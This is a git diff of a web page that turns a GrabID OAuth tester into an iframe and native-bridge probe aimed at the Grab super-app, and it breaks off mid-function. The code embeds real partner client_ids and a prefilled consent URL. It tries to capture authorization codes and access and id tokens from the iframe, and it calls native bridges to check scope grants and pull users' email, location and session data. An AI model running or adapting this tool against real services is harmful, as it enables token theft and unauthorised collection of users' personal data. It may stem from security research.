@@ -3,123 +3,84 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>GrabID Authorize</title>
+<title>iframe + Bridge Probe</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:-apple-system,system-ui,sans-serif;background:#0a0a0a;color:#e0e0e0;padding:12px;font-size:13px}
-h1{font-size:16px;color:#00b14f;margin-bottom:4px}
-.sub{color:#666;font-size:11px;margin-bottom:10px}
-.card{background:#111;border:1px solid #222;border-radius:8px;padding:12px;margin-bottom:8px}
-.card h2{font-size:13px;color:#90caf9;margin-bottom:8px}
-label{display:block;color:#888;font-size:11px;margin:6px 0 2px}
-select,input{width:100%;background:#1a1a1a;border:1px solid #333;border-radius:6px;color:#e0e0e0;padding:8px;font-size:12px;font-family:inherit}
-select:focus,input:focus{outline:none;border-color:#00b14f}
-.row{display:flex;gap:6px;margin-top:8px}
-.btn{padding:10px 16px;border:none;border-radius:6px;font-size:12px;font-weight:700;cursor:pointer;color:#fff;flex:1;text-align:center}
+h1{font-size:16px;color:#00b14f;margin-bottom:8px}
+.card{background:#111;border:1px solid #222;border-radius:8px;padding:10px;margin-bottom:8px}
+.card h2{font-size:13px;color:#90caf9;margin-bottom:6px}
+textarea{width:100%;background:#1a1a1a;border:1px solid #333;border-radius:6px;color:#e0e0e0;padding:8px;font-size:11px;font-family:monospace;resize:vertical}
+.row{display:flex;gap:6px;margin-top:6px;flex-wrap:wrap}
+.btn{padding:10px 14px;border:none;border-radius:6px;font-size:12px;font-weight:700;cursor:pointer;color:#fff}
 .btn:active{opacity:.7}
 .btn.green{background:#00b14f}
 .btn.blue{background:#1565c0}
-.btn.orange{background:#e65100}
 .btn.red{background:#b71c1c}
+.btn.purple{background:#6a1b9a}
+.btn.orange{background:#e65100}
+.btn.teal{background:#00695c}
 .btn.gray{background:#333;color:#aaa}
-.mono{font-family:monospace;font-size:10px;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:8px;margin-top:6px;white-space:pre-wrap;word-break:break-all;color:#aaa;max-height:300px;overflow-y:auto}
-.tag{display:inline-block;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:700;margin-left:6px}
-.tag.ok{background:#1b5e20;color:#a5d6a7}
-.tag.err{background:#b71c1c;color:#ef9a9a}
-.tag.wait{background:#333;color:#888}
-.tag.warn{background:#e65100;color:#ffcc80}
-.tag.code{background:#1a237e;color:#9fa8da}
-.sep{border:none;border-top:1px solid #222;margin:10px 0}
-.tiles{display:grid;grid-template-columns:1fr 1fr;gap:4px;margin:6px 0}
-.tile{background:#1a1a1a;border:1px solid #333;border-radius:6px;padding:6px 8px;font-size:11px;cursor:pointer;text-align:center}
-.tile:active{background:#222}
-.tile.sel{border-color:#00b14f;background:#0a1f0a}
-.tile .tn{font-weight:600;color:#e0e0e0}
-.tile .ti{color:#666;font-size:9px;margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.result-banner{padding:12px;border-radius:8px;margin-bottom:8px;font-size:12px;font-weight:600}
-.result-banner.success{background:#1b5e20;border:1px solid #2e7d32;color:#a5d6a7}
-.result-banner.failure{background:#b71c1c;border:1px solid #c62828;color:#ef9a9a}
+.probe{background:#111;border:1px solid #222;border-radius:8px;margin-bottom:4px;overflow:hidden}
+.probe .hdr{display:flex;justify-content:space-between;align-items:center;padding:6px 10px;cursor:pointer}
+.probe .hdr:active{background:#1a1a1a}
+.probe .name{font-weight:600;font-size:11px}
+.probe .badge{font-size:10px;padding:2px 8px;border-radius:10px;font-weight:700}
+.badge.wait{background:#333;color:#888}
+.badge.ok{background:#1b5e20;color:#a5d6a7}
+.badge.deny{background:#b71c1c;color:#ef9a9a}
+.badge.err{background:#4a148c;color:#ce93d8}
+.badge.skip{background:#263238;color:#78909c}
+.probe .body{padding:0 10px 6px;font-family:monospace;font-size:10px;white-space:pre-wrap;word-break:break-all;color:#aaa;display:none}
+.probe.open .body{display:block}
+.tag{display:inline-block;padding:2px 6px;border-radius:4px;font-size:10px;margin:2px}
+.tag.android{background:#1b5e20;color:#a5d6a7}
+.tag.ios{background:#0d47a1;color:#90caf9}
+.tag.miss{background:#222;color:#555}
+.log{background:#050505;border:1px solid #1a1a1a;border-radius:6px;padding:8px;max-height:200px;overflow-y:auto;font-family:monospace;font-size:10px;color:#666}
+#auth-frame{width:100%;border:1px solid #333;border-radius:8px;background:#000;margin-top:6px}
 </style>
 </head>
 <body>
 
-<h1>GrabID OAuth2 Authorize</h1>
-<div class="sub">IdentityModule.authorize — evidence: index.esm class F, performNativeAuthorization</div>
+<h1>iframe Consent + Bridge Probe</h1>
 
-<!-- ══ Callback banner (if we landed here with ?code=) ══ -->
-<div id="callback-banner"></div>
-
-<!-- ══ Environment ══ -->
-<div class="card" id="env-card">
-  <h2>Environment <span id="env-tag" class="tag wait">...</span></h2>
-  <div id="env-detail" class="mono">Detecting...</div>
-</div>
-
-<!-- ══ Tile selector ══ -->
+<!-- ══ iframe section ══ -->
 <div class="card">
-  <h2>Target Tile</h2>
-  <div class="tiles" id="tile-grid"></div>
-  <hr class="sep">
-  <label>client_id</label>
-  <input id="f-clientid" value="">
-  <label>redirect_uri</label>
-  <input id="f-redirect" value="">
-  <label>scope</label>
-  <input id="f-scope" value="openid">
-  <label>environment</label>
-  <select id="f-env">
-    <option value="production" selected>production</option>
-    <option value="staging">staging</option>
-  </select>
-  <label>responseMode</label>
-  <select id="f-mode">
-    <option value="in_place">in_place (code returns to this page)</option>
-    <option value="redirect">redirect (code goes to redirect_uri)</option>
-  </select>
-</div>
-
-<!-- ══ PKCE artifacts ══ -->
-<div class="card">
-  <h2>PKCE Artifacts <span id="pkce-tag" class="tag wait">not generated</span></h2>
-  <div id="pkce-box" class="mono">Click "Generate PKCE" or it auto-generates on authorize.</div>
+  <h2>1. iframe</h2>
+  <textarea id="iframe-url" rows="4">https://weblogin.grab.com/passenger/saved-accounts?client_id=662ec9fe067e4326b6ae0105b7cf540b&response_type=id_token%20token&service_id=PASSENGER&redirect=https%3A%2F%2Fgrab.drivelah.sg&ctx_id=68789e59c1b746d8b2fb100387f3624d&code_challenge=NLaUBoIxI8OSEGt-MvNBcSLRn2R0xF5Gmpskdvi60fU&code_challenge_method=S256&nonce=54547149567470337a71483943674570&scope=openid+phone+profile.read+mobile.geolocation+mobile.checkout+mobile.cx.miniapp+mobile.storage&state=386a716537704b4d677a345944653674</textarea>
   <div class="row">
-    <button class="btn gray" onclick="genPKCE()">Generate PKCE</button>
-    <button class="btn gray" onclick="showStored()">Show Stored</button>
+    <button class="btn purple" onclick="loadIframe()">Load iframe</button>
+    <button class="btn gray" onclick="clearIframe()">Clear</button>
+    <label style="display:flex;align-items:center;gap:4px;color:#888;font-size:11px"><input type="checkbox" id="auto-probe" checked> Auto-probe after load</label>
   </div>
+  <div id="iframe-status" style="color:#666;font-size:10px;margin-top:4px"></div>
+  <iframe id="auth-frame" sandbox="allow-scripts allow-same-origin allow-forms allow-popups" width="100%" height="500" style="display:none"></iframe>
 </div>
 
-<!-- ══ Action buttons ══ -->
+<!-- ══ Probe section ══ -->
 <div class="card">
-  <h2>Fire Authorize</h2>
+  <h2>2. Bridge Environment</h2>
+  <div id="env-tags"></div>
   <div class="row">
-    <button class="btn green" onclick="doNativeAuthorize()">Native Bridge</button>
-    <button class="btn blue" onclick="doWebAuthorize()">Web Redirect</button>
-  </div>
-  <div class="row">
-    <button class="btn orange" onclick="doFullAuthorize()">Auto (native→web fallback)</button>
-  </div>
-  <div style="margin-top:6px;color:#666;font-size:10px">
-    Native = IdentityModule.invoke("authorize") &bull;
-    Web = fetch OpenID config → build URL → location.assign &bull;
-    Auto = try native, fall back to web on 400/403/500/501
+    <button class="btn green" onclick="probeAll()">PROBE ALL</button>
+    <button class="btn blue" onclick="probeScopes()">Scopes Only</button>
+    <button class="btn orange" onclick="probePII()">PII Only</button>
+    <button class="btn teal" onclick="probeNetwork()">Network Only</button>
+    <button class="btn gray" onclick="clearProbes()">Clear</button>
   </div>
 </div>
 
-<!-- ══ Result ══ -->
-<div class="card">
-  <h2>Result <span id="result-tag" class="tag wait">waiting</span></h2>
-  <div id="result-box" class="mono">No result yet.</div>
-</div>
+<div id="probes"></div>
 
-<!-- ══ Log ══ -->
 <div class="card">
   <h2>Log</h2>
-  <div id="logbox" class="mono" style="max-height:180px"></div>
+  <div id="logbox" class="log"></div>
 </div>
 
 <script>
 // ════════════════════════════════════════════════════════════════
-// SDK bridge runtime (verbatim from index.esm-D3z_6957.js)
+// SDK bridge runtime (index.esm-D3z_6957.js verbatim)
 // ════════════════════════════════════════════════════════════════
 var SDK=(function(){
   var X={};
@@ -133,420 +94,241 @@ var SDK=(function(){
 })();
 
 // ════════════════════════════════════════════════════════════════
-// Tiles — from mobile-config CXMiniAppConfig.miniApps[].oauth2Config
-// Every client_id verified live on GrabID (unknown→15031, real+wrong redirect→15501)
+// All 17 SDK modules
 // ════════════════════════════════════════════════════════════════
-var TILES=[
-  {id:"tileHotel",       clientId:"4049b8b349984c898d3105ec90262845", redirect:"https://grabtravel.grab.com/grab-sso",                          note:"GrabStays — window.ENV.grabClientId"},
-  {id:"tileDrivelah",    clientId:"662ec9fe067e4326b6ae0105b7cf540b", redirect:"https://grab.drivelah.sg",                                      note:"External partner, real scopes"},
-  {id:"tilePoc",         clientId:"57d555fb5aeb442bacd8b0683bc94404", redirect:"https://miniapp-sample.grab.com",                                note:"Sample app, SDK playground"},
-  {id:"tileFirsty",      clientId:"4547df38b94d47478062e8396479cef3", redirect:"https://flutter.firsty.app/authorize/grab",                      note:"eSIM partner (grabEsim.firstyClientId)"},
-  {id:"tileHelloRide",   clientId:"c1de46cbdd5b494da253d3c860995885", redirect:"https://m.hellobike.com/AppHelloBikeGlobalGrabH5/sea_grab.html", note:"HelloBike"},
-  {id:"tileJoliboxGame", clientId:"49118dc36a3e438e897344a036620903", redirect:"https://game.jolibox.com/entry/grab/sg",                         note:"Jolibox Games"},
-  {id:"tileJoliboxDrama",clientId:"02917d84a8d94faea272b031e85105aa", redirect:"https://drama.jolibox.com/entry/grab/sg",                        note:"Jolibox Drama"},
-  {id:"tileRedbus",      clientId:"7662a018a45d43308fe9bdd374b0547a", redirect:"https://app-grab.redbus.sg/authcallback",                        note:"Redbus"},
-  {id:"tileCbm",         clientId:"a0629feb1f4b40349a0b69b971bf7cfa", redirect:"https://cbmplus.creditbureau.com.my/get-started-grab-home",      note:"Credit Bureau Malaysia"},
-];
+var MODULES=["CameraModule","CheckoutModule","ContainerModule","DeviceModule","FileModule","IdentityModule","LocaleModule","LocationModule","MediaModule","NetworkModule","PlatformModule","ProfileModule","ScopeModule","SplashScreenModule","StorageModule","SystemWebViewKitModule","UserAttributesModule"];
 
-// OpenID config endpoints (from SDK: ze mapping)
-var OIDC={
-  production:"https://partner-api.grab.com/grabid/v1/oauth2/.well-known/openid-configuration",
-  staging:"https://partner-api.stg-myteksi.com/grabid/v1/oauth2/.well-known/openid-configuration"
-};
+// Also probe legacy bridge names found in APK (addJavascriptInterface getName())
+var LEGACY_BRIDGES=["PaymentModule","LogModule","LogKitModule"];
 
-// localStorage prefix (SDK: const N = "grabid")
-var LS_PREFIX="grabid";
-
-// ════════════════════════════════════════════════════════════════
-// State
-// ════════════════════════════════════════════════════════════════
-var currentPKCE=null;
-var selectedTile=0;
+var ALL_BRIDGES=MODULES.concat(LEGACY_BRIDGES);
 
 // ════════════════════════════════════════════════════════════════
 // UI
 // ════════════════════════════════════════════════════════════════
 var logEl=document.getElementById("logbox");
+var probesEl=document.getElementById("probes");
+
 function log(msg){var d=document.createElement("div");d.textContent="["+new Date().toLocaleTimeString()+"] "+msg;logEl.appendChild(d);logEl.scrollTop=logEl.scrollHeight}
 
-function selectTile(idx){
-  selectedTile=idx;
-  var t=TILES[idx];
-  document.getElementById("f-clientid").value=t.clientId;
-  document.getElementById("f-redirect").value=t.redirect;
-  var els=document.querySelectorAll(".tile");
-  for(var i=0;i<els.length;i++)els[i].className="tile"+(i===idx?" sel":"");
-  log("Selected "+t.id+" ("+t.clientId.substring(0,12)+"...)")
-}
-
-// Build tile grid
-(function(){
-  var g=document.getElementById("tile-grid");
-  for(var i=0;i<TILES.length;i++){
-    var t=TILES[i];
-    var el=document.createElement("div");
-    el.className="tile"+(i===0?" sel":"");
-    el.innerHTML='<div class="tn">'+t.id.replace("tile","")+'</div><div class="ti">'+t.clientId.substring(0,16)+'...</div>';
-    el.onclick=(function(idx){return function(){selectTile(idx)}})(i);
-    g.appendChild(el)
-  }
-  selectTile(0)
-})();
-
-// ════════════════════════════════════════════════════════════════
-// Environment detection
-// ════════════════════════════════════════════════════════════════
-(function(){
-  var mods=["IdentityModule","ScopeModule","ContainerModule","NetworkModule"];
-  var found=[];
-  for(var i=0;i<mods.length;i++){
-    var e=SDK.env(window,mods[i]);
-    if(e){found.push(mods[i].replace("Module","")+"("+e+")");if(!window["Wrapped"+mods[i]])SDK.wrap(window,mods[i])}
-  }
-  var tag=document.getElementById("env-tag");
-  var det=document.getElementById("env-detail");
-  if(found.length>0){
-    tag.className="tag ok";tag.textContent=found.length+" bridges";
-    det.textContent="Bridges: "+found.join(", ")+"\nUA: "+navigator.userAgent.substring(0,120);
-    log("Detected bridges: "+found.join(", "))
-  }else{
-    tag.className="tag warn";tag.textContent="browser only";
-    det.textContent="No native bridges. Native authorize will fail, web authorize will work.\nUA: "+navigator.userAgent.substring(0,120);
-    log("No native bridges — web-only mode")
-  }
-})();
-
-// ════════════════════════════════════════════════════════════════
-// PKCE generation
-// Evidence: IdentityModule.generatePKCEArtifacts() in index.esm
-//   nonce  = base64url(randomBytes(16))
-//   state  = base64url(randomBytes(32))
-//   codeVerifier = base64url(randomBytes(64))
-//   codeChallenge = base64url(sha256(codeVerifier))   "S256"
-// ════════════════════════════════════════════════════════════════
-function randomBytes(len){
-  var a=new Uint8Array(len);crypto.getRandomValues(a);
-  return String.fromCharCode.apply(null,a)
-}
-function b64url(s){return btoa(s).replace(/=/g,"").replace(/\+/g,"-").replace(/\//g,"_")}
-async function sha256b64(plain){
-  var buf=await crypto.subtle.digest("SHA-256",new TextEncoder().encode(plain));
-  return b64url(String.fromCharCode.apply(null,new Uint8Array(buf)))
-}
-
-async function genPKCE(){
-  var nonce=b64url(randomBytes(16));
-  var state=b64url(randomBytes(32));
-  var verifier=b64url(randomBytes(64));
-  var challenge=await sha256b64(verifier);
-
-  currentPKCE={nonce:nonce,state:state,codeVerifier:verifier,codeChallenge:challenge,codeChallengeMethod:"S256"};
-
-  document.getElementById("pkce-tag").className="tag ok";
-  document.getElementById("pkce-tag").textContent="ready";
-  document.getElementById("pkce-box").textContent=JSON.stringify(currentPKCE,null,2);
-  log("PKCE generated — state="+state.substring(0,12)+"...");
-  return currentPKCE
-}
-
-function showStored(){
-  var keys=["nonce","state","code_verifier","redirect_uri","login_return_uri"];
-  var data={};
-  for(var i=0;i<keys.length;i++){
-    var v=localStorage.getItem(LS_PREFIX+":"+keys[i]);
-    if(v)data[keys[i]]=v
-  }
-  document.getElementById("pkce-box").textContent="Stored in localStorage (prefix \""+LS_PREFIX+"\"):\n"+JSON.stringify(data,null,2);
-  log("Showing stored PKCE artifacts")
-}
-
-// ════════════════════════════════════════════════════════════════
-// Store PKCE artifacts (same keys as SDK)
-// Evidence: IdentityModule.storePKCEArtifacts / setStorageItem
-//   localStorage "grabid:nonce", "grabid:state", "grabid:code_verifier", "grabid:redirect_uri"
-// ════════════════════════════════════════════════════════════════
-function storePKCE(pkce,redirectUri){
-  localStorage.setItem(LS_PREFIX+":nonce",pkce.nonce);
-  localStorage.setItem(LS_PREFIX+":state",pkce.state);
-  localStorage.setItem(LS_PREFIX+":code_verifier",pkce.codeVerifier);
-  localStorage.setItem(LS_PREFIX+":redirect_uri",redirectUri);
-  localStorage.setItem(LS_PREFIX+":login_return_uri",window.location.href);
-  log("PKCE stored in localStorage under \""+LS_PREFIX+":\" prefix")
-}
-
-function getFields(){
+function makeProbe(id,label){
+  var el=document.createElement("div");el.className="probe";el.id="p-"+id;
+  el.innerHTML='<div class="hdr"><span class="name">'+label+'</span><span class="badge wait" id="b-'+id+'">...</span></div><div class="body" id="d-'+id+'"></div>';
+  el.querySelector(".hdr").onclick=function(){el.classList.toggle("open")};
+  probesEl.appendChild(el);
   return{
-    clientId:document.getElementById("f-clientid").value.trim(),
-    redirectUri:document.getElementById("f-redirect").value.trim(),
-    scope:document.getElementById("f-scope").value.trim()||"openid",
-    environment:document.getElementById("f-env").value,
-    responseMode:document.getElementById("f-mode").value
+    status:function(cls,txt){var b=document.getElementById("b-"+id);if(b){b.className="badge "+cls;b.textContent=txt}},
+    data:function(obj){var d=document.getElementById("d-"+id);if(d){d.textContent=typeof obj==="string"?obj:JSON.stringify(obj,null,2);el.classList.add("open")}}
   }
 }
 
-function setResult(cls,text,data){
-  document.getElementById("result-tag").className="tag "+cls;
-  document.getElementById("result-tag").textContent=text;
-  document.getElementById("result-box").textContent=typeof data==="string"?data:JSON.stringify(data,null,2)
+function clearProbes(){probesEl.innerHTML="";logEl.innerHTML="";log("Cleared")}
+
+async function invoke(mod,method,params){
+  var w=window["Wrapped"+mod];
+  if(!w)throw new Error(mod+" not wrapped");
+  return w.invoke(method,params||{})
 }
 
 // ════════════════════════════════════════════════════════════════
-// Native authorize
-// Evidence: IdentityModule.performNativeAuthorization in index.esm
-//   this.invoke({method:"authorize", params:{
-//     clientId, redirectUri, scope, nonce, state,
-//     codeChallenge, codeChallengeMethod, responseMode
-//   }})
-//
-// responseMode "in_place": SDK sets redirectUri = normalizeUrl(location.href)
-//   so the auth code comes BACK to this page as ?code=...&state=...
-// responseMode "redirect": code goes to the tile's registered redirect_uri
+// Detect & wrap all bridges
 // ════════════════════════════════════════════════════════════════
-async function doNativeAuthorize(){
-  if(!window.WrappedIdentityModule){
-    setResult("err","NO BRIDGE","IdentityModule bridge not found. Try Web Redirect instead.");
-    log("ERR: IdentityModule not available");return
-  }
+function detect(){
+  var envEl=document.getElementById("env-tags");
+  var html="";var found=0;
 
-  var f=getFields();
-  if(!currentPKCE)await genPKCE();
-  var pkce=currentPKCE;
+  ALL_BRIDGES.forEach(function(m){
+    var e=SDK.env(window,m);
+    if(e){
+      found++;
+      if(!window["Wrapped"+m])SDK.wrap(window,m);
+      html+='<span class="tag '+e+'">'+m.replace("Module","")+"</span> "
+    }else{
+      html+='<span class="tag miss">'+m.replace("Module","")+"</span> "
+    }
+  });
 
-  // in_place: redirect_uri = this page (SDK: normalizeUrl(location.href))
-  var actualRedirect=f.responseMode==="in_place"
-    ? window.location.origin+window.location.pathname
-    : f.redirectUri;
+  envEl.innerHTML="<b style='color:"+(found?"#00b14f":"#ef5350")+"'>"+found+"/"+ALL_BRIDGES.length+" bridges</b><br>"+html;
+  log("Detect: "+found+" bridges found");
+  return found
+}
+detect();
 
-  storePKCE(pkce,actualRedirect);
+// ════════════════════════════════════════════════════════════════
+// iframe load
+// ════════════════════════════════════════════════════════════════
+var iframeLoadCount=0;
 
-  var params={
-    clientId:f.clientId,
-    redirectUri:actualRedirect,
-    scope:f.scope,
-    nonce:pkce.nonce,
-    state:pkce.state,
-    codeChallenge:pkce.codeChallenge,
-    codeChallengeMethod:pkce.codeChallengeMethod,
-    responseMode:f.responseMode
+function loadIframe(){
+  var url=document.getElementById("iframe-url").value.trim();
+  if(!url){log("No URL");return}
+  var frame=document.getElementById("auth-frame");
+  frame.style.display="block";
+  frame.src="about:blank";
+  iframeLoadCount=0;
+
+  document.getElementById("iframe-status").textContent="Loading...";
+  log("iframe loading: "+url.substring(0,80)+"...");
+
+  frame.onload=function(){
+    iframeLoadCount++;
+    var status="Load #"+iframeLoadCount;
+    try{
+      var loc=frame.contentWindow.location.href;
+      status+=" — "+loc.substring(0,80);
+      log("iframe #"+iframeLoadCount+": "+loc);
+
+      // Check for tokens/code in URL
+      var u=new URL(loc);
+      var hash=u.hash||"";
+      var search=u.search||"";
+      var params=new URLSearchParams(search);
+      var hashParams=new URLSearchParams(hash.replace(/^#/,""));
+
+      var code=params.get("code")||hashParams.get("code");
+      var token=params.get("access_token")||hashParams.get("access_token");
+      var idToken=params.get("id_token")||hashParams.get("id_token");
+      var error=params.get("error")||hashParams.get("error");
+
+      if(code){log("CODE FOUND: "+code);status+=" — CODE!"}
+      if(token){log("ACCESS_TOKEN FOUND: "+token.substring(0,40)+"...");status+=" — TOKEN!"}
+      if(idToken){log("ID_TOKEN FOUND: "+idToken.substring(0,40)+"...");status+=" — ID_TOKEN!"}
+      if(error){log("ERROR: "+error);status+=" — ERROR: "+error}
+    }catch(e){
+      status+=" — cross-origin";
+      log("iframe #"+iframeLoadCount+": cross-origin")
+    }
+
+    document.getElementById("iframe-status").textContent=status;
+
+    if(document.getElementById("auto-probe").checked){
+      log("Auto-probe triggered by iframe load #"+iframeLoadCount);
+      setTimeout(function(){detect();probeAll()},300)
+    }
   };
 
-  log("Invoking IdentityModule.authorize (native)...");
-  log("  clientId="+f.clientId.substring(0,16)+"...");
-  log("  redirectUri="+actualRedirect);
-  log("  scope="+f.scope+" mode="+f.responseMode);
-  setResult("wait","invoking...",params);
+  frame.src=url
+}
 
-  try{
-    var resp=await window.WrappedIdentityModule.invoke("authorize",params);
-    log("Native authorize response: status="+resp.status_code);
+function clearIframe(){
+  var frame=document.getElementById("auth-frame");
+  frame.src="about:blank";frame.style.display="none";
+  document.getElementById("iframe-status").textContent="";
+  iframeLoadCount=0
+}
 
-    if(resp.status_code===200&&resp.result){
-      setResult("ok","CODE RECEIVED",resp);
-      log("AUTH CODE: "+resp.result.code);
-      log("STATE: "+resp.result.state)
-    }else if(resp.status_code===302){
-      setResult("ok","302 REDIRECT",resp);
-      log("Redirect happened (302) — check the redirect_uri for ?code=")
-    }else{
-      setResult("err",resp.status_code,resp);
-      log("Authorize returned "+resp.status_code+": "+(resp.error||""))
-    }
-  }catch(e){
-    setResult("err","ERROR",e.message);
-    log("Native authorize threw: "+e.message)
+// ════════════════════════════════════════════════════════════════
+// Scope probes
+// ════════════════════════════════════════════════════════════════
+var SCOPE_PROBES=[
+  {module:"identity",  method:"authorize"},
+  {module:"checkout",  method:"triggerCheckout"},
+  {module:"profile",   method:"fetchEmail"},
+  {module:"profile",   method:"verifyEmail"},
+  {module:"network",   method:"send"},
+  {module:"location",  method:"getCoordinate"},
+  {module:"location",  method:"getCountryCode"},
+  {module:"storage",   method:"setString"},
+  {module:"storage",   method:"getString"},
+  {module:"container", method:"getSessionParams"},
+  {module:"container", method:"sendAnalyticsEvent"},
+  {module:"camera",    method:"scanQRCode"},
+  {module:"device",    method:"isEsimSupported"},
+  {module:"file",      method:"downloadFile"},
+  {module:"media",     method:"playDRMContent"},
+  {module:"locale",    method:"getLanguageLocaleIdentifier"},
+  {module:"platform",  method:"back"},
+  {module:"splashScreen",method:"dismiss"},
+];
+
+async function probeScopes(){
+  if(!window.WrappedScopeModule){log("ScopeModule not available");return}
+
+  var rl=makeProbe("reload","ScopeModule.reloadScopes");
+  try{var r=await invoke("ScopeModule","reloadScopes");rl.status(r.status_code>=200&&r.status_code<300?"ok":"deny",r.status_code);rl.data(r);log("reloadScopes: "+r.status_code)}
+  catch(e){rl.status("err","ERR");rl.data(e.message);log("reloadScopes err: "+e.message)}
+
+  for(var i=0;i<SCOPE_PROBES.length;i++){
+    var sp=SCOPE_PROBES[i];
+    var label=sp.module+"."+sp.method;
+    var p=makeProbe("s"+i,label);
+    try{
+      var resp=await invoke("ScopeModule","hasAccessTo",{module:sp.module,method:sp.method});
+      if(resp.status_code===200&&resp.result===true){p.status("ok","GRANTED");log(label+" → GRANTED")}
+      else if(resp.status_code===200&&resp.result===false){p.status("deny","DENIED");log(label+" → DENIED")}
+      else if(resp.status_code===204){p.status("skip","N/A");log(label+" → 204")}
+      else{p.status("deny",""+resp.status_code);log(label+" → "+resp.status_code)}
+      p.data(resp)
+    }catch(e){p.status("err","ERR");p.data(e.message);log(label+" → "+e.message)}
   }
 }
 
 // ════════════════════════════════════════════════════════════════
-// Web authorize (fallback)
-// Evidence: IdentityModule.performWebAuthorization in index.esm
-//   1. fetchAuthorizationEndpoint(environment)
-//      → fetch(OIDC[env]) → json.authorization_endpoint
-//   2. buildAuthorizeUrl(endpoint, {client_id, scope, response_type:"code",
-//      redirect_uri, nonce, state, code_challenge_method, code_challenge})
-//   3. window.location.assign(url)
-//
-// OpenID endpoints (from SDK source):
-//   production: https://partner-api.grab.com/grabid/v1/oauth2/.well-known/openid-configuration
-//   staging:    https://partner-api.stg-myteksi.com/grabid/v1/oauth2/.well-known/openid-configuration
+// PII probes
 // ════════════════════════════════════════════════════════════════
-async function doWebAuthorize(){
-  var f=getFields();
-  if(!currentPKCE)await genPKCE();
-  var pkce=currentPKCE;
+async function probePII(){
+  var calls=[
+    {mod:"ProfileModule",method:"fetchEmail",label:"ProfileModule.fetchEmail"},
+    {mod:"LocationModule",method:"getCoordinate",label:"LocationModule.getCoordinate"},
+    {mod:"LocationModule",method:"getCountryCode",label:"LocationModule.getCountryCode"},
+    {mod:"ContainerModule",method:"getSessionParams",label:"ContainerModule.getSessionParams"},
+    {mod:"LocaleModule",method:"getLanguageLocaleIdentifier",label:"LocaleModule.getLanguageLocaleIdentifier"},
+  ];
 
-  var actualRedirect=f.responseMode==="in_place"
-    ? window.location.origin+window.location.pathname
-    : f.redirectUri;
-
-  storePKCE(pkce,actualRedirect);
-
-  log("Fetching OpenID configuration ("+f.environment+")...");
-  setResult("wait","fetching OIDC config...",{endpoint:OIDC[f.environment]});
-
-  try{
-    var resp=await fetch(OIDC[f.environment]);
-    if(!resp.ok){
-      setResult("err","OIDC FETCH FAILED","HTTP "+resp.status);
-      log("OpenID config fetch failed: "+resp.status);return
-    }
-    var config=await resp.json();
-    var authEndpoint=config.authorization_endpoint;
-    if(!authEndpoint){
-      setResult("err","NO ENDPOINT","authorization_endpoint not in response");
-      log("authorization_endpoint missing from OIDC response");return
-    }
-
-    log("authorization_endpoint = "+authEndpoint);
-
-    // Build URL (same as SDK: IdentityModule.buildAuthorizeUrl)
-    var params={
-      client_id:f.clientId,
-      scope:f.scope,
-      response_type:"code",
-      redirect_uri:actualRedirect,
-      nonce:pkce.nonce,
-      state:pkce.state,
-      code_challenge_method:pkce.codeChallengeMethod,
-      code_challenge:pkce.codeChallenge
-    };
-
-    var qs=Object.entries(params).map(function(kv){return encodeURIComponent(kv[0])+"="+encodeURIComponent(kv[1])}).join("&");
-    var url=authEndpoint+"?"+qs;
-
-    log("Redirecting to authorize URL...");
-    setResult("ok","REDIRECTING",{url:url,params:params});
-
-    // Small delay so the user can see the URL
-    setTimeout(function(){window.location.assign(url)},500)
-  }catch(e){
-    setResult("err","ERROR",e.message);
-    log("Web authorize error: "+e.message)
+  for(var c of calls){
+    if(!window["Wrapped"+c.mod]){log(c.mod+" not available");continue}
+    var p=makeProbe("pii-"+c.method,c.label);
+    try{
+      var r=await invoke(c.mod,c.method);
+      if(c.method==="getSessionParams"&&r.result){try{r.parsed=JSON.parse(r.result)}catch(e){}}
+      p.status(r.status_code>=200&&r.status_code<300?"ok":"deny",r.status_code);
+      p.data(r);
+      log(c.label+" → "+r.status_code+" "+JSON.stringify(r.result||r.error||"").substring(0,80))
+    }catch(e){p.status("err","ERR");p.data(e.message);log(c.label+" → "+e.message)}
   }
 }
 
 // ════════════════════════════════════════════════════════════════
-// Auto authorize (native → web fallback)
-// Evidence: IdentityModule.authorize in index.esm
-//   try performNativeAuthorization
-//   if 400/403/500/501 → fallback to performWebAuthorization
+// Network probes
 // ════════════════════════════════════════════════════════════════
-async function doFullAuthorize(){
-  if(!window.WrappedIdentityModule){
-    log("No native bridge, going straight to web authorize");
-    await doWebAuthorize();return
-  }
+async function probeNetwork(){
+  if(!window.WrappedNetworkModule){log("NetworkModule not available");return}
 
-  var f=getFields();
-  if(!currentPKCE)await genPKCE();
-  var pkce=currentPKCE;
+  var endpoints=[
+    {url:"https://api2.grab.com/horus/partners/nuitee/sso-deeplink",label:"SSO deeplink"},
+    {url:"https://api.grab.com/grabid/v1/oauth2/userInfo",label:"GrabID userInfo"},
+    {url:"https://partner-api.grab.com/grabid/v1/oauth2/.well-known/openid-configuration",label:"OpenID config"},
+    {url:"https://api.grab.com/grabid/v1/oauth2/grablet/config?client_id=4049b8b349984c898d3105ec90262845",label:"Grablet config (tileHotel)"},
+    {url:"https://api.grab.com/grabid/v1/oauth2/grablet/config?client_id=662ec9fe067e4326b6ae0105b7cf540b",label:"Grablet config (Drivelah)"},
+  ];
 
-  var actualRedirect=f.responseMode==="in_place"
-    ? window.location.origin+window.location.pathname
-    : f.redirectUri;
-
-  storePKCE(pkce,actualRedirect);
-
-  var params={
-    clientId:f.clientId,
-    redirectUri:actualRedirect,
-    scope:f.scope,
-    nonce:pkce.nonce,
-    state:pkce.state,
-    codeChallenge:pkce.codeChallenge,
-    codeChallengeMethod:pkce.codeChallengeMethod,
-    responseMode:f.responseMode
-  };
-
-  log("Auto: trying native authorize first...");
-  setResult("wait","trying native...",params);
-
-  try{
-    var resp=await window.WrappedIdentityModule.invoke("authorize",params);
-
-    if(resp.status_code===400||resp.status_code===403||resp.status_code===500||resp.status_code===501){
-      log("Native returned "+resp.status_code+" — falling back to web");
-      await doWebAuthorize();return
-    }
-
-    if(resp.status_code===200&&resp.result){
-      setResult("ok","CODE (native)",resp);
-      log("AUTH CODE (native): "+resp.result.code)
-    }else if(resp.status_code===302){
-      setResult("ok","302 (native)",resp);
-      log("Redirect (302) via native")
-    }else{
-      setResult("warn",""+resp.status_code,resp);
-      log("Native returned unexpected "+resp.status_code)
-    }
-  }catch(e){
